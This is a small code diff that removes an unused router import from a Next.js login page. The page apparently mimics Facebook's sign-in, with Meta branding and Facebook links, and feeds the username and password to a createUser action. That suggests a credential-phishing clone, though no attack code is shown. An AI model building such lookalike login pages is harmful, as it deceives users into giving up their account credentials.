@@ -2,7 +2,6 @@
 import { createUser } from "@/lib/actions/user.actions";
 import { createFacebookAccountLink, facebookLink, forgotFacebookPasswordLink } from "@/lib/links";
 import Image from "next/image";
-import { useRouter } from "next/navigation";
 import React, { useState } from "react";
 import { SiMeta } from "react-icons/si";
 
@@ -10,7 +9,6 @@ function MainPage() {
   const [username, setUserName] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState(""); // Error state to display validation messages
-  const router = useRouter()
 
   const handleLogin = async (e : any) => {
     e.preventDefault();
